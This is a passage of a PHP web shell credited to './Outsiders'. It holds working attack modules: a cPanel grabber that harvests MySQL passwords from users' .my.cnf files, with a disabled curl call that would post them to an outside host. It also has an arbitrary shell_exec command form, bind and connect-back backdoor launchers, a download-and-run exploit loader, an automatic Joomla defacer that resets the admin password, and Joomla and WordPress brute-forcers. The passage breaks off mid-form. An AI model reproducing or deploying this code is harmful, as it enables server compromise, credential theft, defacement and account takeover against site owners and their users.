echo "<li> <a href='?dir=$dir&do=hashid'>HashID</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Generate</a> </li>";
echo "<li> <a href='?dir=$dir&do=domains'>Domains Viewer</a></li>";
echo "<li> <a href='?dir=$dir&do=reverse'>ReverseIP</a> </li>";
echo "<li> <a href='?dir=$dir&do=ddosattack'>DDOS</a> </li>";
echo "<li> <a href='?dir=$dir&do=adfin'>Admin Finder</a></li><br><br>";
echo "<li> <a href='?dir=$dir&do=bypass-cf'>Bypass CloudFlare</a></li>";
echo "<li> <a href='?dir=$dir&do=bypassserver'>Bypass Server</a></li>";
echo "<li> <a href='?dir=$dir&do=vhost'>Bypass vHost</a> </li>";
echo "<li> <a href='?dir=$dir&do=passwbypass'>Bypass Etc/Passwd</a> </li>";
echo "<li> <a href='?dir=$dir&do=cpftp_auto'>Bomb Mailer</a></li><br><br>";
echo "<li> <a href='?dir=$dir&do=zip'>Zip Menu</a></li>";
echo "<li> <a href='?dir=$dir&do=phpinfo'>PHP Info</a></li>";
echo "<li> <a href='?dir=$dir&do=loghunter'>Log Hunter</a></li>";
echo "<li> <a href='?dir=$dir&do=logs'>Delete Logs</a></li>";
echo "<li> <a href='?dir=$dir&do=contact'>Contact Me</a></li>";
echo "<li> <a href='?dir=$dir&do=about'>About Me</a></li><br><br>";
echo "<li> <a href='?shell&do=kill'>KillSelf</a></li> ";
echo "<li> <a href='?byee&do=logout' style='color:red;'> Logout</a></li> ";

echo "</ul>";
echo "</center>";
echo "<hr color='red'>";
echo "</div>";
echo "<br>";
echo "<center>";
echo "Current DIR: ";
foreach($scdir as $c_dir => $cdir) {	
	echo "<a href='?dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo "[ ".w($dir, perms($dir))." ]";
echo "<br>";
echo "<br>";

	if($_GET['do'] == 'grabcpanel') {
@ini_set('display_errors',0);
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    return trim($ar1[0]);
}
echo '<br><br><style>
textarea {
resize:none;
color:black;
background-color:#ffffff;  
font-size:8pt; color:black;
border:1px solid white ;
border-left: 4px solid white ;
}
input {
color: black;
border:1px dotted white;
}
</style>';
echo '<center>';
$d0mains = @file('/etc/named.conf');
$domains = scandir("/var/named");
if ($domains or $d0mains)
{
    $domains = scandir("/var/named");
    if($domains) {
echo "<table align=center><tr><th valign=top  class=style2> COUNT </th><th valign=top > DOMAIN </th><th valign=top class=style2 > USER </th><th valign=top class=style2 > Password </th><th valign=top class=style2 > .my.cnf </th></tr>";
$count=1;
$dc = 0;
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dirz = '/home/'.$owner['name'].'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$owner['name'].'.txt');
$p=file_get_contents(''.$path.'/'.$owner['name'].'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td valign=top style=border :2px solid white; width: 139px class=style2>".$count++."</td><td valign=top style= width: 139px; border :2px solid white  class=style2 ><a href=http://".$domain.":2082 target=_blank>".$domain."</a></td><td valign=top style= width: 139px; border: 2px solid white  class=style2 >".$owner['name']."</td><td valign=top style= width: 139px; border: 2px solid white  class=style2 >".$password."</td><td valign=top style=border :2px solid white style=width: 139px><a href=".$owner['name'].".txt target=_blank>Click Here</a></td></tr>";
$dc++;
$success3="http://".$domain."|".$owner['name']."|".$password."\n";
//Fungsi log dinonaktifkan oleh ./Outsiders
/*
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"http://ww3s.ws/ok.php");
curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 5.1; rv:18.0) Gecko/20100101 Firefox/18.0');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,"result=".base64_encode($success3));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_HEADER, 1);
$buffer = curl_exec($ch);
*/
}
}
}
echo '</table>';
$total = $dc;
 
echo '</center>';
}else{
$d0mains = @file('/etc/named.conf');
    if($d0mains) {
echo "<table align=center><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
$count=1;
$dc = 0;
$mck = array();
foreach($d0mains as $d0main){
    if(@eregi('zone',$d0main)){
        preg_match_all('#zone "(.*)"#',$d0main,$domain);
        flush();
        if(strlen(trim($domain[1][0])) >2){
            $mck[] = $domain[1][0];
        }
    }
}
$mck = array_unique($mck);
$usr = array();
$dmn = array();
foreach($mck as $o) {
    $infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
    $usr[] = $infos['name'];
    $dmn[] = $o;
}
array_multisort($usr,$dmn);
$dt = file('/etc/passwd');
$passwd = array();
foreach($dt as $d) {
    $r = explode(':',$d);
    if(strpos($r[5],'home')) {
        $passwd[$r[0]] = $r[5];
    }
}
$l=0;
$j=1;
foreach($usr as $r) {
$dirz = '/home/'.$r.'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$r.'.txt');
$p=file_get_contents(''.$path.'/'.$r.'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td valign=top class=style2 style=width: 139px>".$count++."</td><td valign=top class=style2 style=width: 139px><a target=_blank href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td><td valign=top class=style2 style=width: 139px>'.$r."</td><td valign=top class=style2 style=width: 139px>".$password."</td><td valign=top class=style2 style=width: 139px><a href='".$r.".txt' target='_blank'>Click Here</a></td></tr>";
$dc++;
                flush();
                $l=$l?0:1;
                $j++;
                }
            }
            }
echo '</table>';
$total = $dc;
echo '<br><div class=result valign=top class=style2 style=width: 139px >Total cPanel Found = '.$total.'</h3><br />';
echo '</center>';
}
 
}else{
echo "<div class=result><i><font color=#FF0000>ERROR</font><br><font color=#FF0000>/var/named</font> or <font color=#FF0000>etc/named.conf</font> Not Accessible!</i></div>";
}
}
elseif($_GET['do'] == 'bypassserver') { 
?>
<form action="?dir=<?php echo $pwd; ?>&amp;do=bypassserver" method="post">
<center/><br/><b><font color=white>-=[ Command  Bypass Exploit  By ./Outsiders ]=-</font></b><br>
<?php
print_r('
<pre>
<form method="POST" action="">
<b><font color=white><b><font color="white">Command </font></font></b><input name="baba" type="text" class="inputz" size="34">&nbsp;<input type="submit" class="inputzbut" value="Go">
</form>
<form method="POST" action=""><strong><b><font color="white">Menu Bypass</font></strong><select name="liz0" size="1" class="inputz">
<option value="cat /etc/passwd">/etc/passwd</option>
<option value="netstat -an | grep -i listen">netstat</option>
<option value="cat /var/cpanel/accounting.log">/var/cpanel/accounting.log</option>
<option value="cat /etc/syslog.conf">/etc/syslog.conf</option>
<option value="cat /etc/hosts">/etc/hosts</option>
<option value="cat /etc/named.conf">/etc/named.conf</option>
<option value="cat /etc/httpd/conf/httpd.conf">/etc/httpd/conf/httpd.conf</option>
</select> <input type="submit" class="inputzbut" value="G&ouml;">
</form>
</pre>
');
ini_restore("safe_mode");
ini_restore("open_basedir");
$liz0=shell_exec($_POST[baba]); 
$liz0zim=shell_exec($_POST[liz0]); 
$uid=shell_exec('id');
$server=shell_exec('uname -a');
echo "<pre><h4>";

echo $liz0;
echo $liz0zim;
echo "</h4></pre>";
 "</div>"; 
 ?>
 <?php }

elseif($_GET['do'] == 'bypass-cf'){	
echo '
<form method="POST"><br><br>
<center><p align="center" dir="ltr"><b><font size="5" face="Tahoma">+--=[ Bypass CloudFlare By ./Outsiders ]=--+
</font></b></p>
<select class="inputz" name="krz">
	<option>ftp</option>
		<option>direct-conntect</option>
			<option>webmail</option>
				<option>cpanel</option>
</select>
<input class="inputz" type="text" name="target" value="url">
<input class="inputzbut" type="submit" value="Bypass"></center>

';

$target = $_POST['target'];
# Bypass From FTP
if($_POST['krz'] == "ftp") {
$ftp = gethostbyname("ftp."."$target");
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$ftp</font></p>";
} 
# Bypass From Direct-Connect
if($_POST['krz'] == "direct-conntect") {
$direct = gethostbyname("direct-connect."."$target");
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$direct</font></p>";
}
# Bypass From Webmail
if($_POST['krz'] == "webmail") {
$web = gethostbyname("webmail."."$target");
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$web</font></p>";
}
# Bypass From Cpanel
if($_POST['krz'] == "cpanel") {
$cpanel = gethostbyname("cpanel."."$target");
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$cpanel</font></p>";
}
}

elseif($_GET['do'] == 'netsploit'){ 

// bind connect with c
if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) {
	$port = trim($_POST['port']);
	$passwrd = trim($_POST['bind_pass']);
	tulis("bdc.c",$port_bind_bd_c);
 	exe("gcc -o bdc bdc.c");
 	exe("chmod 777 bdc");
 	@unlink("bdc.c");
 	exe("./bdc ".$port." ".$passwrd." &");
 	$scan = exe("ps aux"); 
	if(eregi("./bdc $por",$scan)){ $msg = "<p>Process found running, backdoor setup successfully.</p>"; }
	else { $msg =  "<p>Process not found running, backdoor not setup successfully.</p>"; }
}
// bind connect with perl
elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'Perl')) {
	$port = trim($_POST['port']);
	$passwrd = trim($_POST['bind_pass']);
	tulis("bdp",$port_bind_bd_pl);
	exe("chmod 777 bdp");
 	$p2=which("perl");
 	exe($p2." bdp ".$port." &");
 	$scan = exe("ps aux"); 
	if(eregi("$p2 bdp $port",$scan)){ $msg = "<p>Process found running, backdoor setup successfully.</p>"; }
	else { $msg = "<p>Process not found running, backdoor not setup successfully.</p>"; }
}
// back connect with c
elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'C')) {
	$ip = trim($_POST['ip']);
	$port = trim($_POST['backport']);
	tulis("bcc.c",$back_connect_c);
 	exe("gcc -o bcc bcc.c");
 	exe("chmod 777 bcc");
 	@unlink("bcc.c");
	exe("./bcc ".$ip." ".$port." &");
	$msg = "Now script try connect to ".$ip." port ".$port." ...";
}
// back connect with perl
elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'Perl')) {
	$ip = trim($_POST['ip']);
	$port = trim($_POST['backport']);
	tulis("bcp",$back_connect);
	exe("chmod +x bcp");
	$p2=which("perl");
 	exe($p2." bcp ".$ip." ".$port." &");
 	$msg = "Now script try connect to ".$ip." port ".$port." ...";
}
elseif (isset($_POST['expcompile']) && !empty($_POST['wurl']) && !empty($_POST['wcmd']))
{
	$pilihan = trim($_POST['pilihan']);
	$wurl = trim($_POST['wurl']);
	$namafile = download($pilihan,$wurl);
	if(is_file($namafile)) {
	
	$msg = exe($wcmd);
	}
	else $msg = "error: file not found $namafile";
}

?>
<table class="tabnet">
<tr><th>Port Binding</th><th>Connect Back</th><th>Load and Exploit</th></tr>
<tr>
<td>
<table>
<form method="post" action="?dir=<?php echo $pwd; ?>&amp;do=netsploit">
<tr>
	<td>Port <br><br><br>Pass<br><br><br><br><br></td><td><input class="inputz" type="text" name="port" size="26" value="<?php echo $bindport ?>"><br><br><input class="inputz" type="text" name="bind_pass" size="26" value="<?php echo $bindport_pass; ?>"><br><select class="inputz" size="1" name="use"><option value="Perl">Perl</option><option value="C">C</option></select><br><input class="inputzbut" type="submit" name="bind" value="Bind" style="width:80px"></td></tr>
</form>
</table>
</td>
<td>
<table>
<form method="post" action="?dir=<?php echo $pwd; ?>&amp;do=netsploit">
<tr><td>IP<br><br><br>Port<br><br><br><br><br></td><td><input class="inputz" type="text" name="ip" size="26" value="<?php echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1")); ?>"><br><br><input class="inputz" type="text" name="backport" size="26" value="<?php echo $bindport; ?>"><br><select size="1" class="inputz" name="use"><option value="Perl">Perl</option><option value="C">C</option></select><br><input type="submit" name="backconn" value="Connect" class="inputzbut" style="width:80px"></td></tr>

</form>
</table>
</td>
<td>
<table>
<form method="post" action="?dir=<?php echo $pwd; ?>&amp;do=netsploit">
<tr><td>url<br><br><br>cmd<br><br><br><br><br></td><td><input class="inputz" type="text" name="wurl" style="width:180px;" value="www.some-code/exploits.c"><br><br><input class="inputz" type="text" name="wcmd" style="width:180px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"><br><select size="1" class="inputz" name="pilihan">
<option value="wwget">wget</option>
<option value="wlynx">lynx</option>
<option value="wfread">fread</option>
<option value="wfetch">fetch</option>
<option value="wlinks">links</option>
<option value="wget">GET</option>
<option value="wcurl">curl</option>
</select><br><input type="submit" name="expcompile" class="inputzbut" value="Go" style="width:80px;"></td></tr>
</form>
</table>
</td>
</tr>
</table>
<div style="text-align:center;margin:2px;"><?php echo $msg; ?></div>
<?php } 

elseif($_GET['do'] == 'jodexer'){	
?>
<form action="?dir=<?php echo $pwd; ?>&amp;do=jodexer" method="post">

<?php

function randomt() {
    
        $chars = "abcdefghijkmnopqrstuvwxyz023456789";
        srand((double)microtime()*1000000);
        $i = 0;
        $pass = '' ;
    
        while ($i <= 7) {
            $num = rand() % 33;
            $tmp = substr($chars, $num, 1);
            $pass = $pass . $tmp;
            $i++;
        }
    
        return $pass;
    
    }
    function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1)
    {
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    $ar=trim($ar1[0]);
    return $ar;
    }
    if ($_POST['form_action'])
    {
    
    $text=file_get_contents($_POST['file']);
    $username=entre2v2($text,"public $user = '","';");
    $password=entre2v2($text,"public $password = ', '","';");
    $dbname=entre2v2($text,"public $db = ', '","';");
    $dbprefix=entre2v2($text,"public $dbprefix = '","';");
    $site_url=($_POST['site_url']);
    
    $h="<? echo(stripslashes(base64_decode('".urlencode(base64_encode(str_replace("'","'",($_POST['code']))))."'))); exit; ?>";
    
    $co=randomt();  
      /*
    echo($username);
    echo("<br>");
    echo($password);
    echo("<br>");
    echo($dbname);
    echo("<br>");
    echo($dbprefix);
    echo("<br>");
    */
    $co=randomt();
    
    if ($_POST['form_action'])
    {
    $h="<? echo(stripslashes(base64_decode('".urlencode(base64_encode(str_replace("'","'",($_POST['code']))))."'))); exit; ?>";
    
    
    
    
    
          $link=mysql_connect("dzoed.druknet.bt",$username,$password) ;
    
             mysql_select_db($dbname,$link) ;
    
    $tryChaningInfo = mysql_query("UPDATE ".$dbprefix."users SET username ='admin' , password = '2a9336f7666f9f474b7a8f67b48de527:DiWqRBR1thTQa2SvBsDqsUENrKOmZtAX'");
    echo("<br>[+] Changing admin password to 123456789");  
                    
                     $req =mysql_query("SELECT * from  `".$dbprefix."extensions` ");
                    
    if ( $req )
    {
    #################################################################
    ######################        V1.6         ######################
    #################################################################
    
                  
    $req =mysql_query("SELECT * from  `".$dbprefix."template_styles` WHERE client_id='0' and home='1'");
             $data = mysql_fetch_array($req);
    $template_name=$data["template"];
    
    $req =mysql_query("SELECT * from  `".$dbprefix."extensions` WHERE name='".$template_name."'");
             $data = mysql_fetch_array($req);
    $template_id=$data["extension_id"];
    
    $url2=$site_url."/index.php";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    
    
    $buffer = curl_exec($ch);
    
    $return=entre2v2($buffer ,'<input type="hidden" name="return" value="','"');
    $hidden=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',4);
    
    ///////////////////////////
    $url2=$site_url."/index.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"username=admin&passwd=123456789&option=com_login&task=login&return=".$return."&".$hidden."=1");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $pos = strpos($buffer,"com_config");
    if($pos === false) {
    echo("<br>[-] Login Error");
    exit;
    }
    else {
    echo("<br>[~] Login Successful");
    }
    ///////////////////////////
    $url2=$site_url."/index.php?option=com_templates&task=source.edit&id=".base64_encode($template_id.":index.php");
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $hidden2=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',2);
    if($hidden2) {
    echo("<br>[+] index.php file founded in Theme Editor");
    }
    else {
    echo("<br>[-] index.php Not found in Theme Editor");
    exit;
    }
    echo("<br>[*] Updating Index.php .....");
    $url2=$site_url."/index.php?option=com_templates&layout=edit";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"jform[source]=".$h."&jform[filename]=index.php&jform[extension_id]=".$template_id."&".$hidden2."=1&task=source.save");
    
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $pos = strpos($buffer,'<dd class="message message">');
    if($pos === false) {
    echo("<br>[-] Updating Index.php Error");
    exit;
    }
    else {
    echo("<br>[~] index.php successfully saved");
    }
    #################################################################
    ######################      V1.6  END      ######################
    #################################################################
    
    
    }
    else
    {
    
    #################################################################
    ######################      V1.5           ######################
    #################################################################
                    
    $req =mysql_query("SELECT * from  `".$dbprefix."templates_menu` WHERE client_id='0'");
             $data = mysql_fetch_array($req);
    $template_name=$data["template"];
    
    $url2=$site_url."/index.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $hidden=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',3);
    
    $url2=$site_url."/index.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"username=admin&passwd=123456789&option=com_login&task=login&".$hidden."=1");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $pos = strpos($buffer,"com_config");
    
    if($pos === false) {
    echo("<br>[-] Login Error");
    exit;
    }
    else {
    echo("<br>[+] Login Successful");
    }
    ///////////////////////////
    $url2=$site_url."/index.php?option=com_templates&task=edit_source&client=0&id=".$template_name;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $hidden2=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',6);
    
    if($hidden2) {
    echo("<br>[~] index.php file founded in Theme Editor");
    }
    else {
    echo("<br>[-] index.php Not found in Theme Editor");
    }
    
    echo("<br>[*] Updating Index.php .....");
    $url2=$site_url."/index.php?option=com_templates&layout=edit";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"filecontent=".$h."&id=".$template_name."&cid[]=".$template_name."&".$hidden2."=1&task=save_source&client=0");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $pos = strpos($buffer,'<dd class="message message fade">');
    if($pos === false) {
    echo("<br>[-] Updating Index.php Error");
    exit;
    }
    else {
    echo("<br>[~] index.php successfully saved");
    }
    #################################################################
    ######################      V1.5  END      ######################
    #################################################################
    
    }
    
    }
    
    
    function randomt() {
    
        $chars = "abcdefghijkmnopqrstuvwxyz023456789";
        srand((double)microtime()*1000000);
        $i = 0;
        $pass = '' ;
    
        while ($i <= 7) {
            $num = rand() % 33;
            $tmp = substr($chars, $num, 1);
            $pass = $pass . $tmp;
            $i++;
        }
    
        return $pass;
    
    }
    
    function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1)
    
    {
    
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    $ar=trim($ar1[0]);
    return $ar;
    }
    
    }?>
    <center><br><br>
    <font color="white" size='+3'><b>+--=[ Automatic Joomla Index Changer By ./Outsiders ]=--+</b></font><br><br>
    </center>
    <center><b>
    Link of symlink configuration.php of Joomla<br></b>
    <FORM action=""  method="post">
    <input type="hidden" name="form_action" value="1">
     <input type="text" class="inputz" size="60" name="file" value="http://site.com/sym/home/user/public_html/configuration.php">
    <br>
    <br><b>
    Admin Control panel url</b><br>
    <input type="text" class="inputz" size="40" name="site_url" value="http://site/administrator"><br>
    <br><b>
    Your Index Code</b>
    <br>
    <TEXTAREA rows="20" align="center" style="background:black" cols="120" name="code"> your index code
            </TEXTAREA>
            <br>
    <INPUT  class="inputzbut" type="submit" value="Lets Go Deface !!!" name="Submit">
    </FORM>
     </center>
    <script language=JavaScript>m='%09%09%09%09%09%09%09%3C/td%3E%0A%09%09%09%09%09%09%3C/tr%3E%0A%09%09%09%09%09%3C/table%3E%0A%09%09%09%09%3C/td%3E%0A%3C/html%3E';d=unescape(m);document.write(d);</script>
	<?php
}
elseif($_GET['do'] == 'jbrute'){ 
?>
<form action="?dir=<?php echo $pwd; ?>&amp;do=jbrute" method="post">

	<meta name="author" content="./Outsiders" />
    <meta name="keywords" content="Joomla, Bruter, JoomlaBruter, JoomlaBruterForce, JoomlaBruterForceOnline" />
    <meta name="description" content="./Outsiders" />
<center>
</br></br>
<center><b><font color="lime">+--=[ Joomla Brute Force By Outsiders ]=--+</font></b><br /><br />
<form method="post" action="" enctype="multipart/form-data"> 
<table class="tabnet" width="38%" border="0"><center>
<th colspan="2">Joomla Brute Force</th>
<tr><td><p ><font  class="d1">User :</font></th>
<input class="inputz" type='text' name="usr" value="admin" size="15"> </font></center><br /><br /></p>
</td></tr>
<tr><td><font class="">Sites list :</font> 
</td><td><font class="" >Pass list :</font></td></tr>
<tr>
		<td>
<textarea name="sites" style="background:black;" cols="40" rows="13" ></textarea>
</td><td>
<textarea name="w0rds" style="background:black;" cols="40" rows="13" >
admin
123456
password
102030
123123
12345
123456789
pass
test
admin123
demo
!@#$%^
</textarea>
</td></tr><center><tr><td>
<font > 
<input class="inputzbut" type="submit" name="x" value="start" id="d4"> 
</font></td></tr><br>
Greetz : All Indonesian Hackers <br></center></table>
</form></center>
<?php
@set_time_limit(0); 
if($_POST['x']){ 

echo "<hr>"; 

$sites = explode("\n",$_POST["sites"]); // Get Sites 
$w0rds = explode("\n",$_POST["w0rds"]); // Get w0rdLiSt 

$Attack = new Joomla_brute_Force(); // Active Class 


foreach($w0rds as $pwd){ 

foreach($sites as $site){ 


$Attack->check_it(txt_cln($site),$_POST['usr'],txt_cln($pwd)); // Brute :D 
flush();flush(); 

} 

} 

} 


# Class & Function'z 

function txt_cln($value){  return str_replace(array("\n","\r"),"",$value); } 

class Joomla_brute_Force{ 

public function check_it($site,$user,$pass){ // print result 

if(eregi('com_config',$this->post($site,$user,$pass))){ 

echo "<span class=\"x2\"><b># Success : $user:$pass -> <a href='$site/administrator/index.php'>$site/administrator/index.php</a></b></span><BR>";
$f = fopen("Result.txt","a+"); fwrite($f , "Success ~~ $user:$pass -> $site/administrator/index.php\n"); fclose($f); 
flush(); 
}else{ echo "# Failed : $user:$pass -> $site<BR>"; flush();} 

} 

public function post($site,$user,$pass){ // Post -> user & pass 

$token = $this->extract_token($site); 

$curl=curl_init(); 

curl_setopt($curl,CURLOPT_RETURNTRANSFER,1); 
curl_setopt($curl,CURLOPT_URL,$site."/administrator/index.php"); 
@curl_setopt($curl,CURLOPT_COOKIEFILE,'cookie.txt'); 
@curl_setopt($curl,CURLOPT_COOKIEJAR,'cookie.txt'); 
curl_setopt($curl,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.15) Gecko/2008111317  Firefox/3.0.4'); 
@curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1); 
curl_setopt($curl,CURLOPT_POST,1); 
curl_setopt($curl,CURLOPT_POSTFIELDS,'username='.$user.'&passwd='.$pass.'&lang=en-GB&option=com_login&task=login&'.$token.'=1'); 
curl_setopt($curl,CURLOPT_TIMEOUT,20); 

$exec=curl_exec($curl); 
curl_close($curl); 
return $exec; 

} 

public function extract_token($site){ // get token from source for -> function post 

$source = $this->get_source($site); 

preg_match_all("/type=\"hidden\" name=\"([0-9a-f]{32})\" value=\"1\"/si" ,$source,$token); 

return $token[1][0]; 

} 

public function get_source($site){ // get source for -> function extract_token 

$curl=curl_init(); 
curl_setopt($curl,CURLOPT_RETURNTRANSFER,1); 
curl_setopt($curl,CURLOPT_URL,$site."/administrator/index.php"); 
@curl_setopt($curl,CURLOPT_COOKIEFILE,'cookie.txt'); 
@curl_setopt($curl,CURLOPT_COOKIEJAR,'cookie.txt'); 
curl_setopt($curl,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.15) Gecko/2008111317  Firefox/3.0.4'); 
@curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1); 
curl_setopt($curl,CURLOPT_TIMEOUT,20); 

$exec=curl_exec($curl); 
curl_close($curl); 
return $exec; 

} 

} 
}

elseif($_GET['do'] == 'wpbrute'){	
?>
<form action="?dir=<?php echo $pwd; ?>&amp;do=wpbrute" method="post">
<center>
<br><Br><b><font size='2' >+--=[ Wordpress Brute Force  By Outsiders ]=--+</font><br>
<form enctype="multipart/form-data" method="POST">
  <table width='624' border='0' class='tabnet' id='Box'>
  <tr><th colspan="5">Wordpress Brute Force</th></tr>
    

    <tr>
      <td >&nbsp;</td>
      <td ><p>Hosts:</p></td>
      <td ><p> Users:</p></td>
      <td ><p>Passwords:</p></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td ><textarea style="background:black;" name="hosts" cols="30" rows="10" ><?php if($_POST){echo $_POST['hosts'];} ?></textarea></td>
      <td ><textarea style="background:black;" name="usernames" cols="30" rows="10"  ><?php if($_POST){echo $_POST['usernames'];}else {echo "admin";} ?></textarea></td>
